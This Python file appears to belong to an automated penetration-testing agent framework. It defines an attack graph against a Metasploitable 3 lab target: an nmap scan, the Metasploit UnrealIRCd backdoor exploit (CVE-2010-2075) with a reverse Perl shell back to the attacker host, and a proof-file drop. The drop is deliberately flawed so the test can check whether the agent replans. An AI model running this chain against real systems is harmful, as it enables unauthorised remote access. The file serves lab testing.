"""
Example Attack Graph: DELIBERATELY FLAWED at the IMPACT stage (Metasploitable 3)

This chain is correct up to and including initial access -- it uses a proven,
working lander (UnrealIRCd 3.2.8.1 backdoor on port 6667, CVE-2010-2075) that
reliably opens a NON-ROOT command-shell session. The flaw is isolated to the
IMPACT stage:

  THE FLAW (file_drop):
    The primary target_file is a ROOT-ONLY path -- /root/pwned_flaw_impact.txt.
    The UnrealIRCd backdoor lands a shell as a non-privileged user (typically
    the IRCd service account, NOT root). Writing to /root therefore fails with
    "Permission denied", and the subsequent `cat` of that file also fails.

  EXPECTED ADAPTATION:
    The node ships command_params_alternatives offering /tmp and /var/tmp paths,
    which ARE world-writable. The impact stage subagent (or, failing that, the
    judge -> replanner loop) is expected to detect the Permission-denied failure
    on the root-only path and adapt by swapping in one of the /tmp alternatives,
    completing the proof-of-compromise write in a directory the non-root session
    can actually write to.

  This isolates and exercises IMPACT-stage adaptation (alternative path / replan)
  WITHOUT also having to recover from a broken initial-access vector. Run with
  explore=True so the stage fallback + replanner are active.

Chain:
  recon       -- nmap service scan
  gain_access -- exploit/unix/irc/unreal_ircd_3281_backdoor -> non-root shell
  file_drop   -- write proof file (FLAW: root-only primary path; /tmp alts)
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_flaw_impact_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the UnrealIRCd "
                  "3.2.8.1 backdoor (CVE-2010-2075) on port 6667, land a non-root "
                  "command shell, and drop a verified proof-of-compromise file. "
                  "(This plan is intentionally flawed at the IMPACT stage: the "
                  "primary proof-file path is root-only and unwritable by the "
                  "non-root session -- the system must adapt to a writable path.)",
        target_ip=target_ip,
        name=f"flaw_impact_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Intentionally IMPACT-flawed chain (root-only proof path) to "
                    "test impact-stage adaptation: alternative path / replan.",
        metadata={"scenario": "flaw_impact", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Discover Attack Surface",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's open services and versions",
        objective=f"Discover open ports, services and versions on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -Pn -sV --top-ports 1000 -T4 {target_ip}"],
        max_retries=2,
        tags=["recon"],
    ))

    # WORKING proven lander -- UnrealIRCd 3.2.8.1 backdoor -> non-root shell.
    graph.add_node(AttackNode(
        id="gain_access",
        label="Gain Initial Access (UnrealIRCd backdoor)",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Open a non-root command-shell session on the target",
        objective=f"Run exploit/unix/irc/unreal_ircd_3281_backdoor against "
                  f"{target_ip}:6667 to obtain a command shell. "
                  f"payload cmd/unix/reverse_perl, LHOST={attacker_ip}.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 6667,
        },
        payload="cmd/unix/reverse_perl",
        payload_options={
            "LHOST": attacker_ip,
            "LPORT": 4465,
        },
        max_retries=3,
        tags=["initial_access", "unrealircd", "backdoor"],
    ))

    # THE FLAW: primary target_file is a ROOT-ONLY path the non-root session
    # cannot write -> Permission denied. /tmp alternatives let the stage/replan
    # adapt to a writable directory.
    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File (FLAW: root-only path)",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written artifact in a writable path",
        objective="Write a proof-of-compromise file via the non-root session, "
                  "then read it back to verify the write succeeded. (The primary "
                  "path is root-only; if the write is denied, fall back to a "
                  "world-writable path such as /tmp.)",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "id",
            "echo '{marker}' > {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/root/pwned_flaw_impact.txt",
            "marker": "PWNED via flaw_impact test",
        },
        command_params_alternatives={
            "target_file": ["/tmp/pwned_flaw_impact.txt", "/var/tmp/pwned_flaw_impact.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/root/pwned_flaw_impact.txt"},
        tags=["impact", "file_drop", "proof", "flaw_root_only_path"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "gain_access",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Recon produced usable service data",
            ),
        ],
        evidence="Recon mapped the attack surface",
        rationale="Attempt initial access against the discovered IRC service",
    )

    graph.connect(
        "gain_access", "file_drop",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="A command-shell session was opened",
            ),
        ],
        evidence="Non-root command shell established",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_flaw_impact_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/flaw_impact_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
